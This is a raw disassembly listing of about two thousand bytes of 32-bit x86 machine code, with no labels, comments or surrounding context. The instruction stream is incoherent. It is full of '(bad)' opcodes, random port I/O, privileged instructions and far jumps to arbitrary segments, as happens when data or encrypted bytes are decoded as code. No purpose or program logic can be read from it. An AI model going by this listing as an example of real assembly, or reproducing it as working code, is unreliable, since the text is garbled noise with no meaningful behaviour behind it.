  412ef5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ef6:	push   ss
  412ef7:	mov    al,ds:0x3014bd55
  412efc:	pop    ebx
  412efd:	sar    BYTE PTR [ecx],0xb9
  412f00:	out    dx,eax
  412f01:	jg     0x412ec9
  412f03:	iret   
  412f04:	mov    edi,0x9c0882f3
  412f09:	stos   DWORD PTR es:[edi],eax
  412f0a:	inc    ebx
  412f0b:	xchg   esi,eax
  412f0c:	int    0xae
  412f0e:	mov    ch,0xfc
  412f10:	hlt    
  412f11:	jge    0x412f31
  412f13:	push   edx
  412f14:	ins    DWORD PTR es:[edi],dx
  412f15:	fmulp  st(0),st
  412f17:	xor    DWORD PTR [edi+eiz*2-0x6871bb72],esi
  412f1e:	je     0x412ef5
  412f20:	ss fmulp st(5),st
  412f23:	ret    0x892e
  412f26:	mov    ebx,0x9e001f06
  412f2b:	push   edx
  412f2c:	jnp    0x412ed5
  412f2e:	test   eax,0x9fe42892
  412f33:	mov    edi,0xaa63dc05
  412f38:	js     0x412f7d
  412f3a:	loop   0x412f5e
  412f3c:	mov    bl,0xd6
  412f3e:	cmp    BYTE PTR [ebx],bh
  412f40:	mov    esi,0x1b4dcf10
  412f45:	jmp    0x412fa7
  412f47:	push   esi
  412f48:	mov    ch,0xb3
  412f4b:	dec    ebx
  412f4c:	loopne 0x412f0b
  412f4e:	adc    DWORD PTR [esi+0x5e],edi
  412f51:	xlat   BYTE PTR ds:[ebx]
  412f52:	clc    
  412f53:	in     al,dx
  412f54:	adc    bh,ah
  412f56:	and    DWORD PTR [ebx+esi*4+0x30],edx
  412f5a:	mov    dl,0xb6
  412f5c:	test   al,0xe3
  412f5e:	mov    ?,WORD PTR [edx-0x33fbe72d]
  412f64:	loop   0x412fa1
  412f66:	pop    ss
  412f67:	outs   dx,DWORD PTR ds:[esi]
  412f68:	jg     0x412faa
  412f6a:	jb     0x412fd2
  412f6c:	daa    
  412f6d:	(bad)  
  412f6e:	mov    ch,0x56
  412f70:	mov    ebp,0x74434b72
  412f75:	inc    edi
  412f76:	sti    
  412f77:	in     eax,dx
  412f78:	mov    cl,0x47
  412f7a:	mov    edi,0xbc77010
  412f7f:	mov    al,0x30
  412f81:	fimul  WORD PTR [ebp+0x2b5f7e71]
  412f87:	ss xchg edx,eax
  412f8a:	mov    edi,0x4e2f8b4a
  412f8f:	xor    al,0xc
  412f91:	jne    0x412f6c
  412f93:	scas   eax,DWORD PTR es:[edi]
  412f94:	pop    ebx
  412f95:	or     eax,0xfec5ce13
  412f9a:	add    eax,0x543556cc
  412f9f:	or     ah,BYTE PTR [edx]
  412fa1:	(bad)  
  412fa2:	dec    esi
  412fa3:	mov    esi,0x93a54fb8
  412fa8:	dec    esp
  412fa9:	jns    0x412f69
  412fab:	mov    esi,0xc366706a
  412fb0:	nop
  412fb1:	mov    dh,0x62
  412fb3:	popf   
  412fb4:	rcr    DWORD PTR [edi+0x1e],1
  412fb7:	jg     0x412f72
  412fb9:	jo     0x412f8c
  412fbb:	(bad)  
  412fbc:	les    edi,FWORD PTR [edx-0xa]
  412fbf:	in     al,0x1b
  412fc1:	pop    esi
  412fc2:	sub    al,0x8e
  412fc4:	xor    DWORD PTR [edx],0xffffffa6
  412fc7:	sar    al,0x2e
  412fca:	dec    ebx
  412fcb:	rcr    DWORD PTR [edx],0xfd
  412fce:	push   ss
  412fcf:	ret    
  412fd0:	imul   sp,si,0xb4c9
  412fd5:	je     0x413056
  412fd7:	into   
  412fd8:	retf   0x3dfb
  412fdb:	jle    0x413030
  412fdd:	xor    al,0x93
  412fdf:	mov    ds:0x4f22c6f3,al
  412fe4:	and    eax,0x4eaafcad
  412fe9:	aaa    
  412fea:	sbb    BYTE PTR [ebp+0x43d9f4fe],bl
  412ff0:	push   ebp
  412ff1:	or     al,BYTE PTR [ecx-0x10aa07a5]
  412ff7:	or     eax,0xc71102dd
  412ffc:	popf   
  412ffd:	arpl   WORD PTR [edx+0x54],bx
  413000:	out    dx,al
  413001:	add    DWORD PTR [ebx+0x6d9891fc],esp
  413007:	loopne 0x41300e
  413009:	inc    edx
  41300a:	dec    ebx
  41300b:	or     BYTE PTR [ecx],al
  41300d:	adc    al,0x6e
  41300f:	out    dx,al
  413010:	retf   0x9879
  413013:	es dec edi
  413015:	lds    esp,FWORD PTR [ebx-0x7c]
  413018:	push   edx
  413019:	mov    ds:0xc75830d5,al
  41301e:	xor    dh,BYTE PTR [edi-0x65]
  413021:	xchg   DWORD PTR [ecx+0x3945b602],eax
  413027:	pop    eax
  413028:	(bad)  
  413029:	xor    DWORD PTR [edi+0x1316fbf4],edx
  41302f:	imul   ebx,DWORD PTR [edx-0x47],0xdd0aac4
  413036:	sbb    BYTE PTR [esi+0x52e100bc],0x22
  41303d:	ret    
  41303e:	inc    esp
  41303f:	xchg   ebp,eax
  413040:	je     0x413022
  413042:	call   FWORD PTR [esi+0x4bd44430]
  413048:	sub    DWORD PTR [edx+0x6],esp
  41304b:	pop    esp
  41304c:	inc    edi
  41304d:	pop    eax
  41304e:	rcr    DWORD PTR [eax-0x4a4cb484],1
  413054:	enter  0x9567,0x76
  413058:	lock rcl DWORD PTR [ebp-0x73ac2ab2],0xc3
  413060:	sahf   
  413061:	pop    ds
  413062:	mov    eax,ds:0xabbb1269
  413067:	or     dh,cl
  413069:	push   ebx
  41306a:	inc    eax
  41306b:	jmp    0x41307c
  41306d:	inc    edi
  41306e:	jmp    0x233a9015
  413073:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413074:	das    
  413075:	mov    dh,0x5f
  413077:	mov    ah,0x5e
  413079:	sbb    al,BYTE PTR [ebx]
  41307b:	push   esi
  41307c:	mov    edi,0xb45ef802
  413081:	inc    esp
  413082:	retf   0xc2fa
  413085:	icebp  
  413086:	jmp    0x413028
  413088:	dec    ecx
  413089:	push   ebx
  41308a:	jle    0x41308a
  41308c:	pop    eax
  41308d:	std    
  41308e:	adc    eax,0x1138d70f
  413093:	scas   al,BYTE PTR es:[edi]
  413094:	sub    al,0xe5
  413096:	xor    bh,bh
  413098:	cwde   
  413099:	jbe    0x413067
  41309b:	mov    ecx,0xc7496c80
  4130a0:	xor    al,0x16
  4130a2:	loop   0x4130f5
  4130a4:	imul   edx,eax,0xbba612c
  4130aa:	repnz xor al,0xd8
  4130ad:	xchg   esi,eax
  4130ae:	inc    ecx
  4130af:	xor    BYTE PTR [ecx],ch
  4130b1:	sub    BYTE PTR [edi-0x5d],dh
  4130b4:	jbe    0x4130e1
  4130b6:	jmp    0x413078
  4130b8:	add    ebp,DWORD PTR [ecx+0xf39f9f]
  4130be:	pop    es
  4130bf:	cmc    
  4130c0:	mov    edi,esp
  4130c2:	push   cs
  4130c3:	sub    ch,BYTE PTR [ebp+0x20]
  4130c6:	es scas eax,DWORD PTR es:[edi]
  4130c8:	addr16 cmp al,0x97
  4130cb:	add    eax,0xdcf3b81a
  4130d0:	or     eax,0x6afe6bb7
  4130d5:	out    0xbd,eax
  4130d7:	addr16 aas 
  4130d9:	or     al,0x7e
  4130db:	dec    ebx
  4130dc:	push   esp
  4130dd:	in     al,dx
  4130de:	push   cs
  4130df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4130e0:	pusha  
  4130e1:	mov    al,dh
  4130e3:	addr16 leave 
  4130e5:	icebp  
  4130e6:	fbld   TBYTE PTR [ebx+ebp*2]
  4130e9:	and    dl,BYTE PTR [edx]
  4130eb:	or     edi,DWORD PTR [edx-0x4b]
  4130ee:	and    al,0xf3
  4130f0:	fcomi  st,st(7)
  4130f2:	adc    al,0xd8
  4130f4:	push   edi
  4130f5:	shl    esi,1
  4130f7:	test   al,0x88
  4130f9:	in     al,dx
  4130fa:	adc    DWORD PTR [eax-0x79],esp
  4130fd:	xchg   DWORD PTR [esi-0x2e],ebx
  413100:	leave  
  413101:	mov    eax,0x56bf8559
  413106:	enter  0xb246,0x7e
  41310a:	mov    bh,0xa3
  41310c:	ja     0x4130b0
  41310e:	sbb    al,BYTE PTR [edi+0x134e7739]
  413114:	pop    es
  413115:	mov    cl,0xed
  413117:	inc    ebx
  413118:	mov    bl,dh
  41311a:	sbb    eax,0x4a7c4d9b
  41311f:	pop    ecx
  413120:	fisubr DWORD PTR [edx+0x5bab19dd]
  413126:	(bad)  
  413127:	aaa    
  413128:	sub    BYTE PTR [ebp-0x246c1bdf],ch
  41312e:	mov    DWORD PTR [edi+0x5b],eax
  413131:	mov    ecx,0x7880b320
  413136:	test   DWORD PTR [ecx-0x3d],esi
  413139:	xchg   edx,eax
  41313a:	(bad)  
  41313b:	in     eax,0x1a
  41313d:	pop    ss
  41313e:	add    al,0xc
  413140:	sbb    DWORD PTR [ebx-0x63],0x56fdb4fb
  413147:	jne    0x41313d
  413149:	xor    ebp,DWORD PTR [ecx+edx*4]
  41314c:	push   0xffffffa9
  41314e:	mov    ah,0xeb
  413150:	dec    edi
  413151:	arpl   di,sp
  413153:	and    edi,eax
  413155:	les    edi,FWORD PTR [edi-0x59deec68]
  41315b:	sub    bh,BYTE PTR [eax-0x32f1c1cd]
  413161:	push   esi
  413162:	sub    dh,BYTE PTR [edx+0x38]
  413165:	or     al,0xbd
  413167:	dec    ecx
  413168:	mov    esi,0x75d5f032
  41316d:	ja     0x413129
  41316f:	sub    dh,BYTE PTR [ebx]
  413171:	enter  0xcb98,0x4d
  413175:	loop   0x413194
  413177:	jne    0x4131c0
  413179:	fs repz stc 
  41317c:	inc    ebp
  41317d:	lahf   
  41317e:	pop    edi
  413180:	fwait
  413181:	and    al,0x39
  413183:	lods   eax,DWORD PTR ds:[esi]
  413184:	dec    edx
  413185:	aam    0x57
  413187:	push   ecx
  413188:	rcr    ah,0xb9
  41318b:	push   ebp
  41318c:	aaa    
  41318d:	mov    ecx,DWORD PTR [edi+0x51]
  413190:	shr    BYTE PTR [eax],cl
  413192:	in     al,dx
  413193:	outs   dx,BYTE PTR ds:[esi]
  413194:	pop    eax
  413195:	scas   al,BYTE PTR es:[edi]
  413196:	mov    ds:0x1de2dba1,eax
  41319b:	xchg   BYTE PTR [ebx],bh
  41319d:	js     0x413126
  41319f:	mov    ah,BYTE PTR [edi-0x5a]
  4131a2:	sub    eax,0x1b5a129f
  4131a7:	inc    esp
  4131a8:	adc    BYTE PTR [ecx],dl
  4131aa:	ss add eax,0x5961b336
  4131b0:	sub    DWORD PTR [edi],eax
  4131b2:	adc    BYTE PTR [ebx],0x76
  4131b5:	(bad)  
  4131b6:	adc    BYTE PTR [edi+0x5572938c],bl
  4131bc:	scas   al,BYTE PTR es:[edi]
  4131bd:	push   0xb1fefad5
  4131c2:	out    dx,al
  4131c3:	loop   0x4131c8
  4131c5:	mov    ah,0x80
  4131c7:	and    DWORD PTR [ecx],esp
  4131c9:	into   
  4131ca:	inc    DWORD PTR [esi-0x2f]
  4131cd:	je     0x41322e
  4131cf:	jg     0x413199
  4131d1:	jbe    0x41315d
  4131d3:	scas   eax,DWORD PTR es:[edi]
  4131d4:	or     DWORD PTR [eax+0x2a],edi
  4131d7:	enter  0x5ccf,0x74
  4131db:	(bad)  
  4131dc:	mov    ebx,0x791e26bd
  4131e1:	and    DWORD PTR [esi-0x55],ebx
  4131e4:	and    esi,ebp
  4131e6:	mov    cl,0xab
  4131e8:	ds inc edx
  4131ea:	jecxz  0x4131a4
  4131ec:	jbe    0x413257
  4131ee:	dec    ebx
  4131ef:	jl     0x413198
  4131f1:	mov    eax,ds:0xe7bc25b7
  4131f6:	or     eax,0x300e79e8
  4131fb:	pop    ecx
  4131fc:	sub    al,0x9b
  4131fe:	dec    ebp
  4131ff:	jno    0x4131e7
  413201:	sub    BYTE PTR [edi],bh
  413203:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413204:	pop    ds
  413205:	dec    edi
  413206:	adc    esi,DWORD PTR [edx+0x33304211]
  41320c:	push   ebx
  41320d:	nop
  41320e:	pop    edx
  41320f:	subps  xmm6,XMMWORD PTR [edx+0x5ee2d65e]
  413216:	clc    
  413217:	fst    DWORD PTR [edx-0x6b]
  41321a:	inc    esp
  41321b:	gs fwait
  41321d:	jo     0x41320c
  41321f:	ins    DWORD PTR es:[edi],dx
  413220:	fcomp  DWORD PTR [ecx-0x20aef4bf]
  413226:	aad    0x40
  413228:	out    dx,al
  413229:	and    al,ch
  41322b:	bound  esp,QWORD PTR [ebx+0x51]
  41322e:	icebp  
  41322f:	not    BYTE PTR [edi+esi*1+0x56a66028]
  413236:	loop   0x413298
  413238:	sbb    bh,al
  41323a:	inc    edi
  41323b:	cld    
  41323c:	les    eax,FWORD PTR [eax-0x73]
  41323f:	xchg   edi,eax
  413240:	test   al,0x23
  413242:	fs js  0x41320f
  413245:	shl    BYTE PTR [ebp+0x1dbab982],1
  41324b:	ja     0x41323d
  41324d:	call   0x718136c1
  413252:	mov    ?,WORD PTR [ebx-0x40]
  413255:	push   esp
  413256:	test   DWORD PTR [eax],0xadf281de
  41325c:	sbb    eax,0x26654ec0
  413261:	add    DWORD PTR [eax+0x687380a4],eax
  413267:	cmp    eax,0xec820d93
  41326c:	add    al,0x7
  41326e:	sub    eax,0x4bf1b9c0
  413273:	sub    dh,BYTE PTR [ecx-0x22]
  413276:	mov    eax,0xdb6a51c1
  41327b:	(bad)
  41327e:	les    ebp,FWORD PTR [eax-0x1fa4e0ee]
  413284:	mov    eax,ds:0xd1cc58a8
  413289:	jae    0x413210
  41328b:	call   FWORD PTR [ecx-0x16]
  41328e:	call   0x9e1d:0xb1e516c5
  413295:	dec    esp
  413296:	in     al,dx
  413297:	add    bh,BYTE PTR [edi-0x55b3c0bd]
  41329d:	push   esi
  41329e:	adc    DWORD PTR [esi+0x48efeacb],0xffffffc4
  4132a5:	and    BYTE PTR [ecx+0x4f14cd2e],0xcb
  4132ac:	popf   
  4132ad:	xchg   ebp,eax
  4132ae:	push   esi
  4132af:	mov    al,ds:0x6b499989
  4132b4:	scas   eax,DWORD PTR es:[edi]
  4132b5:	mov    edx,0xbfa7c045
  4132ba:	dec    edx
  4132bb:	pusha  
  4132bc:	(bad)  
  4132bd:	out    0xb9,al
  4132bf:	es pop es
  4132c1:	call   0x22c5dbe5
  4132c6:	fdiv   st,st(3)
  4132c8:	imul   ebp,DWORD PTR [ebx-0x42123c1e],0xc94ecd4c
  4132d2:	adc    eax,0x496acbba
  4132d7:	mov    ds:0x6a1f67a4,al
  4132dc:	push   cs
  4132dd:	sub    al,0xb6
  4132df:	ins    DWORD PTR es:[edi],dx
  4132e0:	cli    
  4132e1:	lods   eax,DWORD PTR ds:[esi]
  4132e2:	(bad)  
  4132e3:	dec    edi
  4132e4:	dec    eax
  4132e5:	out    dx,al
  4132e6:	rol    BYTE PTR [edi],cl
  4132e8:	mov    BYTE PTR [edi],0x20
  4132eb:	xor    BYTE PTR [edx-0x1aef0b7],al
  4132f1:	jl     0x413281
  4132f3:	fist   DWORD PTR [ebp-0x29]
  4132f6:	ret    
  4132f7:	adc    al,0x8c
  4132f9:	arpl   WORD PTR [eax+0x7d8f88c6],bp
  4132ff:	xlat   BYTE PTR ds:[ebx]
  413300:	imul   eax,DWORD PTR [eax-0x31],0xffffffbb
  413304:	mov    bl,0xf7
  413306:	mov    eax,ds:0x70a87c0a
  41330b:	pusha  
  41330c:	ss xor cl,ch
  41330f:	and    cl,ah
  413311:	jge    0x41334b
  413313:	(bad)  
  413314:	cmp    al,dh
  413316:	sti    
  413317:	xor    DWORD PTR [esi+0x7b],esi
  41331a:	in     eax,0xf4
  41331c:	outs   dx,DWORD PTR ds:[esi]
  41331d:	cmp    DWORD PTR [esi-0x3b],ecx
  413320:	je     0x413397
  413322:	leave  
  413323:	mov    dh,0xdf
  413325:	int3   
  413326:	sbb    ah,BYTE PTR [esi-0x423d46e4]
  41332c:	ds pop ebp
  41332e:	sub    al,0xd2
  413330:	(bad)  
  413331:	in     eax,dx
  413332:	dec    edx
  413333:	jmp    0x413356
  413335:	sar    DWORD PTR [ebx+0x46],cl
  413338:	fstp   QWORD PTR [eax+eiz*8]
  41333b:	das    
  41333c:	outs   dx,DWORD PTR ds:[esi]
  41333d:	dec    ebp
  41333e:	jns    0x41334e
  413340:	call   0x75e3:0xdae4ff1a
  413347:	int    0x8
  413349:	das    
  41334a:	xchg   esi,eax
  41334b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41334c:	aas    
  41334d:	lahf   
  41334e:	dec    ebx
  41334f:	pop    eax
  413350:	call   0xa24002cf
  413355:	sub    eax,0x42cd260a
  41335a:	pop    edx
  41335b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41335c:	pop    esp
  41335d:	in     eax,dx
  41335e:	or     ebp,DWORD PTR [esi+0x60]
  413361:	sbb    dh,dh
  413363:	test   BYTE PTR [eax-0x6d721ac4],0xd1
  41336a:	inc    ecx
  41336b:	mov    eax,ds:0xb66bc6fc
  413370:	cmp    edx,DWORD PTR [esi+ebp*4]
  413373:	pop    edi
  413375:	sub    al,0xd6
  413377:	cmc    
  413378:	aam    0x89
  41337a:	dec    edx
  41337b:	mov    ebx,?
  41337d:	fisub  WORD PTR [edi+0x48]
  413380:	(bad)  
  413381:	push   esp
  413382:	in     eax,dx
  413383:	mov    ds:0x3c360db5,eax
  413388:	mov    eax,ds:0xbfd52a65
  41338d:	xchg   ecx,eax
  41338e:	out    dx,al
  41338f:	adc    al,0xe3
  413391:	jnp    0x413318
  413393:	ret    
  413394:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413395:	int    0xd5
  413397:	lea    ebp,[ebp+0x4cf84ed1]
  41339d:	or     DWORD PTR [edx],esp
  41339f:	jmp    0x53f8:0x5f55b75c
  4133a6:	mov    ah,0x24
  4133a8:	fistp  QWORD PTR [ebx+0x2b88e579]
  4133ae:	dec    esi
  4133af:	aad    0x53
  4133b1:	pop    esp
  4133b2:	clc    
  4133b3:	inc    eax
  4133b4:	cmp    esp,DWORD PTR [ebx+0x1ca2f2b3]
  4133ba:	push   esi
  4133bb:	clc    
  4133bc:	ja     0x41342d
  4133be:	or     al,BYTE PTR [edi+0x5fb9c8c8]
  4133c4:	mov    ebx,0xcced757a
  4133c9:	add    esp,edx
  4133cb:	fstp   DWORD PTR [ebx-0x19b51bd3]
  4133d1:	scas   eax,DWORD PTR es:[edi]
  4133d2:	mov    al,ds:0x2306bb56
  4133d7:	cmp    BYTE PTR [edi-0x76],dh
  4133da:	call   0xe94:0x529955a2
  4133e1:	sub    ebp,DWORD PTR [edi+eiz*1-0x70866028]
  4133e8:	mov    cl,0x16
  4133ea:	inc    esi
  4133eb:	pop    esp
  4133ec:	cdq    
  4133ed:	or     BYTE PTR [edx-0x5b],ah
  4133f0:	mov    ebx,0x3775dc72
  4133f5:	das    
  4133f6:	mov    ds:0x4f619a25,eax
  4133fb:	xchg   edi,eax
  4133fc:	or     eax,eax
  4133fe:	push   ebx
  4133ff:	jno    0x41346d
  413401:	repz inc esp
  413403:	gs push 0x10
  413406:	mov    bh,0xbe
  413408:	mov    edi,0x879cfc6e
  41340d:	imul   edi,DWORD PTR [edi],0x8b1138fd
  413413:	mov    al,ds:0x2f309008
  413418:	push   0xffffffdf
  41341a:	sub    ah,BYTE PTR [eax+0x3017a1aa]
  413420:	sbb    al,BYTE PTR [edx]
  413422:	mov    ch,0x4e
  413424:	out    dx,al
  413425:	ins    DWORD PTR es:[edi],dx
  413426:	adc    ch,BYTE PTR [ecx]
  413428:	inc    ebx
  413429:	pushf  
  41342a:	xchg   edi,eax
  41342b:	stc    
  41342c:	call   0x3c56:0xc79b8b74
  413433:	cmp    DWORD PTR [esi],esp
  413435:	lods   eax,DWORD PTR ds:[esi]
  413436:	sbb    BYTE PTR ds:0xbd03747d,dh
  41343c:	mov    WORD PTR [esi+edx*1+0x58],es
  413440:	mov    esp,edi
  413442:	xchg   DWORD PTR [ecx+ebp*4+0x1f],esp
  413446:	inc    esp
  413447:	inc    edi
  413448:	jmp    0xced4e4c2
  41344d:	repnz mov esi,0x636d397c
  413453:	mov    eax,ds:0x153ac576
  413458:	xchg   DWORD PTR [edx+0x1e3c4fb0],esi
  41345e:	push   esp
  41345f:	int3   
  413460:	(bad)  
  413462:	mov    cl,dh
  413464:	jnp    0x4134be
  413466:	push   0x70c24c4
  41346b:	out    0x7b,al
  41346d:	shr    BYTE PTR [ecx-0x67],cl
  413470:	scas   al,BYTE PTR es:[edi]
  413471:	adc    BYTE PTR [esi-0x76d58ec7],ch
  413477:	jns    0x4134c9
  413479:	add    cl,bh
  41347b:	push   0x2d6f0a40
  413480:	in     eax,0x17
  413482:	and    dh,BYTE PTR [edx+eax*4+0x2b]
  413486:	aad    0x97
  413488:	mov    eax,0x4505b145
  41348d:	mov    DWORD PTR [edi],esi
  41348f:	dec    esp
  413490:	pusha  
  413491:	sahf   
  413492:	push   0x7c
  413494:	jg     0x4134a8
  413496:	mov    DWORD PTR [eax],eax
	...
  413514:	call   0xbb94:0xbf94b5b1
  41351b:	mov    edi,0x1b5d8b00
  413520:	int    0x7b
  413522:	sbb    edx,DWORD PTR [edx+0xdcd9]
  413528:	imul   eax,DWORD PTR [edi],0x0
  41352b:	add    BYTE PTR [ebx+0x11],ah
  41352e:	add    dh,dh
  413530:	into   
  413531:	loopne 0x4134f5
  413533:	fisub  DWORD PTR [ecx+0x37]
  413536:	icebp  
  413537:	jge    0x4134fa
  413539:	ds pushaw 
  41353c:	push   ecx
  41353d:	fucomip st,st(6)
  41353f:	push   es
  413540:	xor    al,0x17
  413542:	inc    ebx
  413543:	jbe    0x4135be
  413545:	xchg   ebx,eax
  413546:	cmp    eax,0x9bf57fdc
  41354b:	fmul   st(2),st
  41354d:	dec    esi
  41354e:	out    0x65,eax
  413550:	inc    eax
  413551:	je     0x4135a3
  413553:	jecxz  0x4135bd
  413555:	aad    0xe5
  413557:	xchg   esp,eax
  413558:	jge    0x413522
  41355a:	pushf  
  41355b:	(bad)  
  41355c:	adc    al,0x5f
  41355e:	xchg   esp,eax
  41355f:	jbe    0x4134f6
  413561:	arpl   sp,bp
  413563:	mov    ebp,0x753f8042
  413568:	pop    ds
  413569:	arpl   WORD PTR [eax],ax
  41356b:	hlt    
  41356c:	jmp    0x413555
  41356e:	mov    dl,BYTE PTR [edx-0x64]
  413571:	mov    WORD PTR [ecx+0x7bbe7319],es
  413577:	jp     0x413558
  413579:	icebp  
  41357a:	fucom  st(6)
  41357c:	mov    dl,0x34
  41357e:	push   es
  41357f:	push   ds
  413580:	mov    ds:0xddb9b9de,eax
  413585:	mov    eax,ds:0x2c759944
  41358a:	(bad)  gs:[edx-0xd]
  41358e:	jmp    0xafcf0296
  413593:	stc    
  413594:	in     al,0x9a
  413596:	test   al,0xba
  413598:	or     eax,0x6b98d655
  41359d:	add    dl,BYTE PTR ds:0xde194cb7
  4135a3:	in     eax,0x66
  4135a5:	loope  0x41357e
  4135a7:	lock fnstsw WORD PTR [ebx-0x24]
  4135ab:	aas    
  4135ac:	inc    ebp
  4135ad:	loopne 0x4135ac
  4135af:	cdq    
  4135b0:	inc    esp
  4135b1:	pop    ds
  4135b2:	jae    0x413633
  4135b4:	sub    eax,eax
  4135b6:	or     eax,0x165981e0
  4135bb:	clc    
  4135bc:	ins    DWORD PTR es:[edi],dx
  4135bd:	dec    eax
  4135be:	ss into 
  4135c0:	lods   eax,DWORD PTR ds:[esi]
  4135c1:	mov    ah,0xd1
  4135c3:	(bad)
  4135c6:	test   BYTE PTR [ebp+0x733feea],al
  4135cc:	pop    ebx
  4135cd:	mov    ecx,0xd99f6cb7
  4135d2:	(bad)  
  4135d3:	pop    ds
  4135d4:	sti    
  4135d5:	ja     0x4135f5
  4135d7:	push   0xe6b822ef
  4135dc:	test   al,0xea
  4135de:	lods   eax,DWORD PTR ds:[esi]
  4135df:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4135e1:	mov    esp,0x11072747
  4135e6:	jbe    0x41361b
  4135e8:	mov    edx,0xf1f02952
  4135ed:	loope  0x41364e
  4135ef:	sti    
  4135f0:	ret    0x553b
  4135f3:	jmp    0xf92bf3a7
  4135f8:	push   eax
  4135f9:	sub    BYTE PTR [edx+0x7d],dl
  4135fc:	stos   DWORD PTR es:[edi],eax
  4135fd:	sbb    BYTE PTR [edi],bl
  4135ff:	retf   0xab68
  413602:	in     eax,0x45
  413604:	sub    ah,BYTE PTR [ebx]
  413606:	jle    0x413666
  413608:	repz dec edi
  41360a:	(bad)  
  41360c:	fisttp WORD PTR ds:0xb0ae6c5c
  413612:	ds pop ebp
  413614:	test   DWORD PTR [edx+edi*4],eax
  413617:	jns    0x413689
  413619:	fidivr DWORD PTR [ebx]
  41361b:	lock dec esp
  41361d:	clc    
  41361e:	xchg   edx,eax
  41361f:	mov    ebp,0x39bca673
  413624:	daa    
  413625:	stos   DWORD PTR es:[edi],eax
  413626:	retf   0x1dfd
  413629:	adc    BYTE PTR [esp+ebx*2],bl
  41362c:	stos   BYTE PTR es:[edi],al
  41362d:	aam    0x2a
  41362f:	nop
  413630:	push   0x8d15bc77
  413635:	mov    eax,ds:0x8a9c60e1
  41363a:	xor    al,0xd7
  41363c:	sti    
  41363d:	aam    0x94
  41363f:	mov    esi,0xdd6452ef
  413644:	nop    DWORD PTR [ebp+0x56]
  413648:	test   BYTE PTR [ebx+0x5827e7b7],al
  41364e:	iret   
  41364f:	pop    ebp
  413650:	pop    esi
  413651:	jnp    0x41363d
  413653:	mov    ch,0xd6
  413655:	jbe    0x4135e7
  413657:	and    esp,DWORD PTR [edi+edx*8]
  41365a:	pop    es
  41365b:	mov    ebx,0xa6dffe12
  413660:	xchg   DWORD PTR [ebp-0x716db265],ebx
  413666:	jl     0x413612
  413668:	hlt    
  413669:	icebp  
  41366a:	xchg   esi,eax
  41366b:	popa   
  41366c:	sub    DWORD PTR ds:0xde021045,eax
  413672:	jl     0x413671
  413674:	or     al,0xd4
  413676:	xchg   esi,eax
  413677:	sbb    BYTE PTR [eax+0x2a6edb2c],cl
  41367d:	fsub   DWORD PTR [ecx-0x5a]
  413680:	xchg   ecx,eax
  413681:	(bad)  
  413682:	push   ebp
  413683:	test   al,0xf8
  413685:	addr16 pop esi
  413687:	hlt    
  413688:	pop    ecx
  413689:	daa    
  41368a:	adc    eax,0x4e8dbbe7
  41368f:	lock xchg ecx,eax
  413691:	mov    ds:0x1db9a105,al
  413696:	pushf  
  413697:	clc    
  413698:	mov    esi,0x13906f9f
  41369d:	push   ss
  41369e:	in     eax,0xa7
  4136a0:	inc    ebp
  4136a1:	aam    0xb1
  4136a3:	outs   dx,DWORD PTR ds:[esi]
  4136a4:	into   
  4136a5:	(bad)  
  4136a6:	dec    ebx
  4136a7:	push   ebx
  4136a8:	bound  esp,QWORD PTR [ecx+0x2f]
  4136ab:	dec    ecx
  4136ac:	sbb    DWORD PTR ds:0xda45f8de,0x3c
  4136b4:	mov    bh,0x1e
  4136b6:	mov    ?,WORD PTR [edx]
  4136b8:	loopne 0x413736
  4136ba:	inc    ebp
  4136bb:	cwde   
  4136bc:	sbb    eax,0xe8cfe4ac
  4136c1:	dec    esi
  4136c2:	xsave  [edi-0x20]
  4136c6:	mov    ch,0x97
  4136c8:	loopne 0x413670
  4136ca:	or     al,0xc5
  4136cc:	dec    ebx
  4136cd:	jmp    ebp
  4136cf:	imul   ebp,DWORD PTR [eax],0xffffffff
  4136d2:	or     dh,BYTE PTR [eax-0x5f9780c7]
  4136d8:	jb     0x4136cb
  4136da:	shl    bl,cl
  4136dc:	sbb    al,0xe9
  4136de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4136df:	loopne 0x4136a4
  4136e1:	pop    ss
  4136e2:	lock mov ebx,0xeff9da43
  4136e8:	(bad)  
  4136e9:	aam    0x4e
  4136eb:	(bad)  
  4136ec:	mov    bh,0xb7
  4136ee:	mov    eax,0xa6db479b
  4136f3:	sbb    al,0x73
  4136f5:	mov    edx,0x8f65c1dd
  4136fa:	dec    eax
  4136fb:	mov    eax,ds:0xcb409293
  413700:	xchg   esp,eax
  413701:	jno    0x413683
  413703:	jmp    DWORD PTR [esi-0x26]
  413706:	sub    ebx,DWORD PTR [edi-0x659f4823]
  41370c:	das    
  41370d:	out    0x93,eax
  41370f:	js     0x413751
  413711:	lock nop
  413713:	mov    ds:0x9fe627db,eax
  413718:	xchg   ecx,eax
  413719:	nop
  41371a:	retf   
  41371b:	dec    eax
  41371c:	out    0x1f,eax
  41371e:	jnp    0x41372d
  413720:	mov    ecx,0x7c27c6e
  413725:	jg     0x413701
  413727:	popf   
  413728:	pop    ebp
  413729:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41372a:	jae    0x4136bb
  41372c:	int    0xd4
  41372e:	add    al,0x20
  413730:	outs   dx,DWORD PTR ds:[esi]
  413731:	or     ebx,DWORD PTR [esi-0x73]
  413734:	add    ch,BYTE PTR [edi+0xd]
  413737:	pop    ebp
  413738:	push   0xfffffffd
  41373a:	pop    ebx
  41373b:	xor    bl,bh
  41373d:	adc    DWORD PTR [ebp+ebx*2+0x3b],esp
  413741:	xchg   ebp,eax
  413742:	cli    
  413743:	inc    eax
  413744:	push   ss
  413745:	mov    ebp,0x5570767
  41374a:	cld    
  41374b:	jo     0x413758
  41374d:	mov    edx,0xcc287705
  413752:	xor    dh,BYTE PTR [edi+0x2b8327ae]
  413758:	stc    
  413759:	push   0x68
  41375b:	push   cs
  41375c:	mov    edx,0xff4500ca
  413761:	data16 fisub WORD PTR [edi]
  413764:	mov    dh,0xf0
  413766:	nop
  413767:	ret    0xe160
  41376a:	adc    al,0x62
  41376c:	sbb    DWORD PTR [esi+0x13],esi
  41376f:	mov    esp,0xbe93e347
